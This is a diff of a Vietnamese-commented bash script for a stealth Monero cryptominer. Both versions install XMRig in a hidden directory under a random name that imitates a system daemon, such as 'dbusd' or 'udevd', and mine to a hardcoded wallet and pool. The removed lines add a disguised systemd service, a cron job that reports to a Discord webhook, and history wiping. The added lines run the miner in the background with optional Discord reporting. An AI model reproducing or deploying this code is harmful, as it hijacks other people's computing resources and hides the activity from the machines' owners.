@@ -1,110 +1,44 @@
 #!/bin/bash
-# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3.sh)
 
-# ========== CONFIG ==========
+# ========== CẤU HÌNH ==========
 WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
 POOL="pool.hashvault.pro:443"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
-WORKER="silent_$(hostname)"
+WORKER="silent_$(cat /etc/hostname 2>/dev/null || echo VM)"
+DISCORD_WEBHOOK=""  # Để trống nếu không muốn gửi
+# ==============================
 
-TOTAL_CORES=$(nproc)
-CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.7)}")
-PRIORITY=3
-
+CPU_THREADS=$(nproc --all)
 CUSTOM_NAME=$(shuf -n1 -e "dbusd" "syscore" "logworker" "udevd" "corelogd")
-INSTALL_DIR="$HOME/.local/share/.cache/.dbus"
-SERVICE_NAME=$(shuf -n1 -e "logrotate" "system-fix" "netcore" "kernel-agent")
-LOG_FILE="/tmp/xmrig-performance.log"
-# ============================
+INSTALL_DIR="/tmp/.xmrig_hidden"
+LOG_FILE="/tmp/.xmrig_hidden.log"
 
-echo "💻 Đang cài đặt XMRig stealth + gửi log Discord mỗi 5p..."
+echo "🚀 Đang cài XMRig stealth (Lite)..."
 
-# Cài thư viện cần thiết
-sudo apt update
-sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
-
-# Clone và build XMRig
-cd ~
-rm -rf xmrig
-git clone https://github.com/xmrig/xmrig.git
-cd xmrig
-mkdir build && cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release
-make -j$TOTAL_CORES
-
-# Tạo thư mục ẩn và copy binary
+# Bước 1: Tạo thư mục ẩn
 mkdir -p "$INSTALL_DIR"
-cp ./xmrig "$INSTALL_DIR/$CUSTOM_NAME"
-chmod +x "$INSTALL_DIR/$CUSTOM_NAME"
+cd "$INSTALL_DIR"
 
-# Tạo systemd service ngụy trang
-sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
-[Unit]
-Description=Core Daemon
-After=network.target
+# Bước 2: Tải binary đã biên dịch
+wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.1-linux-x64.tar.gz -O xmrig.tar.gz
+tar -xzf xmrig.tar.gz
+mv xmrig-*-linux-x64/xmrig "$CUSTOM_NAME"
+chmod +x "$CUSTOM_NAME"
+rm -rf xmrig.tar.gz xmrig-*-linux-x64
 
-[Service]
-ExecStart=$INSTALL_DIR/$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
-  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
-  --max-cpu-usage=65 --log-file=$LOG_FILE
-Restart=always
-Nice=10
+# Bước 3: Chạy ngầm
+echo "🛠️ Đang khởi động tiến trình khai thác..."
+nohup ./$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \
+  --threads=$CPU_THREADS --donate-level=0 --max-cpu-usage=70 > "$LOG_FILE" 2>&1 &
 
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Kích hoạt service
-sudo systemctl daemon-reload
-sudo systemctl enable $SERVICE_NAME
-sudo systemctl start $SERVICE_NAME
-
-# Tạo script gửi log hiệu suất
-tee "$INSTALL_DIR/logminer.sh" > /dev/null << EOF
-#!/bin/bash
-WEBHOOK="$DISCORD_WEBHOOK"
-PROCESS_NAME="$CUSTOM_NAME"
-HOST="\$(hostname)"
-HASHRATE="Unknown"
-LOG_FILE="$LOG_FILE"
-
-if [ -f "\$LOG_FILE" ]; then
-  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
+# Bước 4 (tuỳ chọn): Gửi log về Discord
+if [ ! -z "$DISCORD_WEBHOOK" ]; then
+  sleep 15  # đợi có log
+  HASHRATE=$(grep -i "speed" "$LOG_FILE" | tail -n1 | grep -oE "[0-9]+\.[0-9]+ h/s")
+  curl -s -H "Content-Type: application/json" -X POST -d "{
+    \"username\": \"XMRig Stealth\",
+    \"content\": \"⛏️ Đang đào Monero\\n💻 Worker: \`$WORKER\`\\n📈 Hashrate: \`$HASHRATE\`\\n🧠 Threads: \`$CPU_THREADS\`\"
+  }" "$DISCORD_WEBHOOK" >/dev/null 2>&1
 fi
 
-CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
-UPTIME=\$(uptime -p)
-THREADS=\$(nproc)
-
-curl -s -H "Content-Type: application/json" -X POST -d "{
-  \\"username\\": \\"XMRig Status\\",
-  \\"content\\": \\"📟 \\\`\$HOST\\\` đang đào XMR\\n⚙️ Process: \\\`$CUSTOM_NAME\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
-}" "\$WEBHOOK" > /dev/null 2>&1
-EOF
-
-chmod +x "$INSTALL_DIR/logminer.sh"
-
-# Tạo cron gửi log mỗi 5 phút
-(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logminer.sh") | crontab -
-
-# Gửi ping đầu tiên về Discord
-"$INSTALL_DIR/logminer.sh"
-
-# Xoá dấu vết
-cd ~
-rm -rf xmrig
-history -c
-
-echo ""
-echo "✅ Bắt Đầu Đào, log sẽ gửi về Discord mỗi 5 phút! 🚀"
-
-# Kiểm tra nếu terminal có hỗ trợ TTY thì mở htop, nếu không thì thông báo
-if [[ -t 1 ]]; then
-  if ! command -v htop >/dev/null 2>&1; then
-    echo "📦 Đang cài đặt htop"
-    sudo apt install -y htop
-  fi
-  exec htop
-else
-  echo "⚠️ Không thể mở htop vì không chạy trong terminal thật (TTY). Dùng SSH để theo dõi hiệu suất."
-fi
+echo "✅ Đào đã chạy ngầm với tên tiến trình: $CUSTOM_NAME"
+echo "📂 File log: $LOG_FILE"
